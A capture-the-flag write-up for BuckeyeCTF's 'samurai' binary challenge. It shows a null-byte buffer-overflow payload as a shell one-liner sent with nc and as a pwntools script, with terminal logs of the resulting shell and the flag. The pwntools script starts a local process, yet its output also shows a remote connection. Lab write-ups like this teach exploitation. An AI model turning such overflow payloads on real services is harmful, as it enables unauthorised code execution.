# Samurai

I use Ghidra and gdb to resolve this chall, the vulnerability is easy to find but there is a suptility to exploit it. We need to add a `\x00` (character `0`) in the payload. The offset is 30 characters, so i use this line to get the shell:

```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'aaaaaaaa\x00aaaaaaaaaaaaaaaaaaaaa\xcctG\x00\n')"; cat -) | /media/kali/Downloads/BuckeyeCTF/samurai
```

My console:

```
┌──(kali㉿kali)-[~]
└─$ (python3 -c "import sys; sys.stdout.buffer.write(b'aaaaaaaa\x00aaaaaaaaaaaaaaaaaaaaa\xcctG\x00\n')"; cat -) | nc pwn.chall.pwnoh.io 13371
Long ago in a distant land...
Haku, the shapeshifting master of appsec, unleashed an UNHACKABLE binary.
But a foolish samurai warrior, wielding a magic terminal, stepped forth to oppose him.
Their name was...
...er, what was it again? RIGHT, right. AAA.
I knew that.
Anyway...
With their weapon in hand, the samurai sprung forth, and with a wide swing of their sword...
...slashed Haku in two!!
As the demon lay vulnerable, our hero prepares a final blow: ls -la
total 24
drwxr-xr-x 1 1000 65534   100 Nov  1 16:45 .
drwxrwx--- 1 1000 65534    86 Nov  7 03:48 ..
-r--r----- 1 1000 65534    43 Oct 30 16:33 flag.txt
-r-xr-x--- 1 1000 65534 17168 Nov  1 16:45 samurai
```

The same payload using `printf`, to get the flag:

```
┌──(kali㉿kali)-[~]
└─$ nc pwn.chall.pwnoh.io 13371 < <(printf 'aaaaaaaa\x00aaaaaaaaaaaaaaaaaaaaa\xcctG\x00\ncat flag.txt')
Long ago in a distant land...
Haku, the shapeshifting master of appsec, unleashed an UNHACKABLE binary.
But a foolish samurai warrior, wielding a magic terminal, stepped forth to oppose him.
Their name was...
...er, what was it again? RIGHT, right. AAA.
I knew that.
Anyway...
With their weapon in hand, the samurai sprung forth, and with a wide swing of their sword...
...slashed Haku in two!!
As the demon lay vulnerable, our hero prepares a final blow: buckeye{7h3_1393nd_0f_7h3_s4mur41_b391n5}
```

I wrote a script with `pwntools` to resolve the challenge:

```python
from pwn import *
c = process("/media/kali/Downloads/BuckeyeCTF/samurai")
c.sendline(b"a" * 8 + b'\x00' + b'a' * 21  + 0x4774cc.to_bytes(4, 'little'))
c.interactive()
```

```
┌──(kali㉿kali)-[~]
└─$ python3 solve_pwn1.py
[+] Starting local process '/media/kali/Downloads/BuckeyeCTF/samurai': pid 17092
[+] Opening connection to pwn.chall.pwnoh.io on port 13371: Done
[*] Switching to interactive mode
Long ago in a distant land...
Haku, the shapeshifting master of appsec, unleashed an UNHACKABLE binary.
But a foolish samurai warrior, wielding a magic terminal, stepped forth to oppose him.
Their name was...
...er, what was it again? RIGHT, right. aaaaaaa.
I knew that.
Anyway...
With their weapon in hand, the samurai sprung forth, and with a wide swing of their sword...
...slashed Haku in two!!
As the demon lay vulnerable, our hero prepares a final blow: $ ls -la
total 24
drwxr-xr-x 1 1000 65534   100 Nov  1 16:45 .
drwxrwx--- 1 1000 65534    86 Nov  7 03:48 ..
-r--r----- 1 1000 65534    43 Oct 30 16:33 flag.txt
-r-xr-x--- 1 1000 65534 17168 Nov  1 16:45 samurai
[*] Got EOF while reading in interactive

┌──(kali㉿kali)-[~]
└─$ python3 solve_pwn1.py
[+] Starting local process '/media/kali/Downloads/BuckeyeCTF/samurai': pid 17814
[+] Opening connection to pwn.chall.pwnoh.io on port 13371: Done
[*] Switching to interactive mode
Long ago in a distant land...
Haku, the shapeshifting master of appsec, unleashed an UNHACKABLE binary.
But a foolish samurai warrior, wielding a magic terminal, stepped forth to oppose him.
Their name was...
...er, what was it again? RIGHT, right. aaaaaaa.
I knew that.
Anyway...
With their weapon in hand, the samurai sprung forth, and with a wide swing of their sword...
...slashed Haku in two!!
As the demon lay vulnerable, our hero prepares a final blow: $ cat fl*
buckeye{7h3_1393nd_0f_7h3_s4mur41_b391n5}

[*] Got EOF while reading in interactive
$ 
$ 
[*] Closed connection to pwn.chall.pwnoh.io port 13371
[*] Got EOF while sending in interactive
[*] Stopped process '/media/kali/Downloads/BuckeyeCTF/samurai' (pid 17814)
```
